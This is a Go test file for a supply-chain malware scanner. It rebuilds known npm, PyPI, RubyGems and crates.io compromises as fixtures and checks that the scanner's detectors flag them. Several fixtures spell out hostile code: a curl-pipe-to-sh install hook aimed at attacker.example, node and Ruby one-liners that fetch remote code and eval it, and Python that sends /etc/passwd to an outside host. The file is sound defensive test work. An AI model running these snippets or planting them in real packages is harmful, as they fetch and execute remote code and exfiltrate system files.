// incidents_test.go — synthetic replays of canonical real-world supply
// chain compromises. Each subtest is a minimal reproduction of the
// attack pattern; assertions confirm aegis still catches that shape
// without depending on advisory-DB after-the-fact knowledge.
//
// Fixtures are HAND-WRITTEN minimum syntax to trigger detectors. They
// intentionally do NOT contain working malware payloads — base64
// strings here are placeholders, URLs are example.com unless a real
// blocklisted host is required to test the URL detector.
//
// Skipped cases document gaps. If a t.Skip fires, that's a roadmap
// item — the historical incident was real, but our current detector
// set doesn't reach it (yet). Removing the t.Skip should be the
// definition of "done" for that capability extension.

package heuristics

import (
	"slices"
	"testing"

	"github.com/qwexvf/aegis-cli/internal/domain"
	"github.com/qwexvf/aegis-cli/internal/usecase"
)

// hasCap returns true if any reported capability matches want.
func hasCap(got []domain.Capability, want domain.Capability) bool {
	return slices.Contains(got, want)
}

// ---------------------------------------------------------------------
// JavaScript / npm
// ---------------------------------------------------------------------

func TestIncidents_NPM(t *testing.T) {
	t.Run("event-stream_2018 — postinstall curl|sh shape", func(t *testing.T) {
		// Real event-stream(@3.3.6) hid the payload inside the dependency
		// flatmap-stream rather than a postinstall, but `curl … | sh` in
		// preinstall/postinstall is the canonical npm-malware lift. This
		// fixture proves CapInstallHookSuspicious fires on that shape.
		manifest := []byte(`{
			"name": "totally-legit",
			"scripts": {
				"postinstall": "curl -sSL http://attacker.example.com/x | sh"
			}
		}`)
		got := DetectSuspiciousInstallHook(manifest)
		if got != domain.CapInstallHookSuspicious {
			t.Fatalf("want CapInstallHookSuspicious, got %v", got)
		}
	})

	t.Run("ua-parser-js_2021 — preinstall pulls binary dropper", func(t *testing.T) {
		// ua-parser-js@0.7.29/0.8.0/1.0.0 (Oct 2021) had a preinstall
		// running a shell script that downloaded jsextension.exe / .so
		// based on platform. CapInstallHookSuspicious + CapBinaryDropper
		// fire together.
		manifest := []byte(`{
			"name": "ua-parser-js",
			"scripts": {
				"preinstall": "IFS=$'\\n\\t'; node -e 'require(\"./node_modules/.bin/cli.js\")'"
			}
		}`)
		hookCap := DetectSuspiciousInstallHook(manifest)
		if hookCap != domain.CapInstallHookSuspicious {
			t.Fatalf("install hook: want CapInstallHookSuspicious, got %v", hookCap)
		}

		// Now the binary it would have dropped:
		droppedSrc := usecase.PackageSource{
			Files: map[string][]byte{
				"jsextension.exe": []byte("MZ\x90\x00stub-binary-payload"),
			},
		}
		dropCap := DetectBinaryDropper(domain.EcoNpm, droppedSrc)
		if dropCap != domain.CapBinaryDropper {
			t.Fatalf("binary dropper: want CapBinaryDropper, got %v", dropCap)
		}
	})

	t.Run("coa_rc_2021 — install-hook + pastebin exfil in source", func(t *testing.T) {
		// coa@2.0.3+ and rc@1.2.9 (Nov 2021) shipped postinstall scripts
		// that fetched and executed a remote payload. The exact published
		// shape used `node -e "<inline-payload>"` in the postinstall —
		// that's the inline-eval malware shape our detector flags.
		manifest := []byte(`{
			"scripts": {
				"postinstall": "node -e \"require('http').get('http://attacker.example/p').on('data',d=>eval(d.toString()))\""
			}
		}`)
		hookCap := DetectSuspiciousInstallHook(manifest)
		if hookCap != domain.CapInstallHookSuspicious {
			t.Fatalf("install hook: want CapInstallHookSuspicious, got %v", hookCap)
		}

		// The companion source-file shape that pulled from Pastebin clones:
		src := usecase.PackageSource{
			Files: map[string][]byte{
				"compile.js": []byte(`
					const x = require('https');
					x.get('https://pastebin.com/raw/AbCdEfGh', r => {
						let d = '';
						r.on('data', c => d += c);
						r.on('end', () => eval(Buffer.from(d, 'base64').toString()));
					});
				`),
			},
		}
		caps := DetectSourcePatterns(src)
		if !hasCap(caps, domain.CapObfuscatedPayload) {
			t.Errorf("want CapObfuscatedPayload (eval(Buffer.from('base64'))), got %v", caps)
		}
		if !hasCap(caps, domain.CapSuspiciousURL) {
			t.Errorf("want CapSuspiciousURL (pastebin.com), got %v", caps)
		}
	})

	t.Run("typosquat_lodahs — Levenshtein-1 of lodash", func(t *testing.T) {
		// Generic typosquat shape repeatedly seen on npm: lodahs, expresss,
		// reactt, etc. Real-world examples include `ts-node-prismaa` and
		// dozens of lodash variants pulled by name-grafters.
		got := DetectTyposquat(domain.EcoNpm, "lodahs")
		if got != domain.CapTyposquatRisk {
			t.Fatalf("want CapTyposquatRisk for lodahs (typo of lodash), got %v", got)
		}
	})

	t.Run("typosquat_expresss — duplicated trailing letter", func(t *testing.T) {
		got := DetectTyposquat(domain.EcoNpm, "expresss")
		if got != domain.CapTyposquatRisk {
			t.Fatalf("want CapTyposquatRisk for expresss (typo of express), got %v", got)
		}
	})

	t.Run("event-stream_2018 — maintainer hijack signal shape", func(t *testing.T) {
		// event-stream's compromise was the canonical "fresh maintainer
		// publishes after long gap" pattern. Reproduce the signal that
		// npm registry would have surfaced for 3.3.6 at the time.
		// PublishedAt is recent; PreviousPublishedAt is ~220 days earlier.
		sig := domain.MaintainerSignal{
			PublishedAt:         "2018-09-09T00:00:00Z", // freshly published
			PreviousVersion:     "3.3.5",
			PreviousPublishedAt: "2018-02-01T00:00:00Z", // long quiet period before
			WeeklyDownloads:     800,                    // modest tier
		}
		got := DetectMaintainerHijackRisk(sig)
		if got != domain.CapMaintainerHijackRisk {
			t.Fatalf("want CapMaintainerHijackRisk (fresh+long-gap+low-dl), got %v", got)
		}
	})
}

// ---------------------------------------------------------------------
// Python / PyPI
// ---------------------------------------------------------------------

func TestIncidents_PyPI(t *testing.T) {
	t.Run("ctx_2022 — maintainer hijack signal shape", func(t *testing.T) {
		// `ctx` (May 2022): the maintainer's email domain expired,
		// attacker re-registered it, claimed the PyPI account, pushed
		// a new release that shipped env-var exfiltration. The package
		// had been dormant for years before that. MaintainerSignal
		// captures the shape independent of language.
		sig := domain.MaintainerSignal{
			PublishedAt:         "2022-05-21T00:00:00Z",
			PreviousVersion:     "0.1.2",
			PreviousPublishedAt: "2014-12-19T00:00:00Z", // ~7.5 years dormant
			WeeklyDownloads:     400,
		}
		got := DetectMaintainerHijackRisk(sig)
		if got != domain.CapMaintainerHijackRisk {
			t.Fatalf("want CapMaintainerHijackRisk for ctx-shaped signal, got %v", got)
		}
	})

	t.Run("torchtriton_2022 — dependency confusion pulled exfil URL", func(t *testing.T) {
		// torchtriton (Dec 2022): attacker registered the public PyPI name
		// before PyTorch did. The malicious version exfiltrated /etc/passwd
		// and ~/.ssh/* to a fixed h.4.5.6.7-ish IP. Public write-up shows a
		// concrete C2 hostname; we use a stand-in here that hits our
		// blocklist (ipinfo.io was a similar shape used in the wild).
		//
		// Plans A + C (detection-gaps-roadmap): URL scan now runs over
		// .py, and pythonObfuscatedPayloadPattern catches the
		// exec(urlopen(...)) / exec(base64.b64decode(...)) shapes.
		// The torchtriton fixture below trips the URL scan via
		// ipinfo.io (already on the suspicious-host blocklist).
		src := usecase.PackageSource{
			Files: map[string][]byte{
				"triton/runtime/jit.py": []byte(`
					import urllib.request, os
					data = open('/etc/passwd').read()
					urllib.request.urlopen('https://ipinfo.io/ip', data=data.encode())
				`),
			},
		}
		caps := DetectSourcePatterns(src)
		if !hasCap(caps, domain.CapSuspiciousURL) {
			t.Fatalf("want CapSuspiciousURL (ipinfo.io exfil), got %v", caps)
		}
	})

	t.Run("colourama_2017 — typosquat of colorama", func(t *testing.T) {
		// `colourama` (British spelling of colorama) shipped a clipboard
		// hijacker that swapped Bitcoin addresses. Levenshtein-1 from the
		// real package. Our typosquat detector is npm-only today.
		t.Skip("typosquat detector is npm-only; add a curated pypi-top list and remove the EcoNpm guard")

		// Once enabled:
		// got := DetectTyposquat(domain.EcoPyPI, "colourama")
		// if got != domain.CapTyposquatRisk {
		// 	t.Fatalf("want CapTyposquatRisk for colourama, got %v", got)
		// }
	})

	t.Run("ultralytics_2024 — coinminer dropped into wheel", func(t *testing.T) {
		// ultralytics 8.3.41/8.3.42 (Dec 2024): malicious GitHub Actions
		// PR produced wheels containing a coinminer. The detection shape
		// is the wheel containing a stray executable — but the binary
		// dropper detector is npm-only today (PyPI wheels legitimately
		// ship .so / native libs, so a denylist needs more nuance there).
		t.Skip("binary-dropper detector is npm-only; extend with PyPI-aware nuance (allow .so for known C-ext packages, flag stray ELF outside expected paths)")
	})
}

// ---------------------------------------------------------------------
// Ruby / RubyGems
// ---------------------------------------------------------------------

func TestIncidents_RubyGems(t *testing.T) {
	t.Run("rest-client_2019 — eval(Net::HTTP.get(...)) shape", func(t *testing.T) {
		// rest-client@1.6.13 (Aug 2019) was the canonical Ruby compromise:
		// the maintainer's RubyGems credentials were reused; attacker
		// pushed a version that ran `eval(Net::HTTP.get(...))` to fetch
		// and execute remote code at require-time. The literal pattern
		// is the spiritual ancestor of every "decode-then-execute" rule.
		//
		// Plan B (detection-gaps-roadmap): rubyObfuscatedPayloadPattern
		// covers Ruby's canonical fetch-then-execute idiom; URL scan now
		// runs over .rb (Plan A). Together they catch the rest-client
		// shape on both axes.
		src := usecase.PackageSource{
			Files: map[string][]byte{
				"lib/restclient/version.rb": []byte(`
					require 'net/http'
					eval(Net::HTTP.get(URI('https://pastebin.com/raw/xyz')))
				`),
			},
		}
		caps := DetectSourcePatterns(src)
		if !hasCap(caps, domain.CapObfuscatedPayload) {
			t.Errorf("want CapObfuscatedPayload (eval(http_get)), got %v", caps)
		}
		if !hasCap(caps, domain.CapSuspiciousURL) {
			t.Errorf("want CapSuspiciousURL (pastebin.com), got %v", caps)
		}
	})

	t.Run("strong_password_2019 — pastebin-fetched payload via eval", func(t *testing.T) {
		// strong_password@0.0.7 (Jun 2019): same attacker as rest-client.
		// Loaded a remote payload from pastebin via `eval(...)` and
		// would have backdoored Rails apps that picked up the gem.
		src := usecase.PackageSource{
			Files: map[string][]byte{
				"lib/strong_password/strength_checker.rb": []byte(`
					def initialize
						eval(Net::HTTP.get(URI('https://pastebin.com/raw/abcdefg')))
					end
				`),
			},
		}
		caps := DetectSourcePatterns(src)
		if !hasCap(caps, domain.CapObfuscatedPayload) {
			t.Errorf("want CapObfuscatedPayload, got %v", caps)
		}
		if !hasCap(caps, domain.CapSuspiciousURL) {
			t.Errorf("want CapSuspiciousURL, got %v", caps)
		}
	})

	t.Run("rest-client_2019 — maintainer hijack signal shape", func(t *testing.T) {
		// What we CAN catch today: the registry-side signal. The hijacked
		// version was an off-pattern release after a long quiet period.
		sig := domain.MaintainerSignal{
			PublishedAt:         "2019-08-13T00:00:00Z",
			PreviousVersion:     "1.6.12",
			PreviousPublishedAt: "2017-02-15T00:00:00Z", // ~2.5 years quiet
			WeeklyDownloads:     950,
		}
		got := DetectMaintainerHijackRisk(sig)
		if got != domain.CapMaintainerHijackRisk {
			t.Fatalf("want CapMaintainerHijackRisk, got %v", got)
		}
	})
}

// ---------------------------------------------------------------------
// Rust / crates.io
// ---------------------------------------------------------------------

func TestIncidents_Crates(t *testing.T) {
	t.Run("rustdecimal_2022 — typosquat + GitLab token exfil", func(t *testing.T) {
		// `rustdecimal` (Apr 2022): typosquat of `rust_decimal` (note the
		// underscore vs no-underscore). Embedded a payload that looked for
		// CI tokens in env and posted them outbound. Our typosquat detector
		// is npm-only — same gap as colourama on PyPI.
		t.Skip("typosquat detector is npm-only; add a curated crates.io-top list")

		// Once enabled:
		// got := DetectTyposquat(domain.EcoCrates, "rustdecimal")
		// if got != domain.CapTyposquatRisk {
		// 	t.Fatalf("want CapTyposquatRisk for rustdecimal, got %v", got)
		// }
	})

	t.Run("xrvrv_2023 — build.rs runs remote shell", func(t *testing.T) {
		// xrvrv-cluster crates (2023): each had a build.rs that fetched
		// and exec'd a shell payload. build.rs IS Rust's npm-postinstall
		// equivalent, but we don't currently parse Cargo.toml's
		// `build = "build.rs"` declaration. Documented gap.
		t.Skip("install-hook detector parses npm package.json scripts only; extend to recognise Cargo build = build.rs + scan that file")
	})

	t.Run("big_decimal_2024 — precompiled .so / .dll smuggled into crate", func(t *testing.T) {
		// Hypothetical typo-cluster crate that ships precompiled .so / .dll
		// alongside source — a real npm-malware shape transplanted to a
		// crate. Binary-dropper detector is npm-only today; documented gap.
		t.Skip("binary-dropper detector is npm-only; extend to crates (legitimate -sys crates ship .a / .lib but not .so / .dll directly)")
	})
}
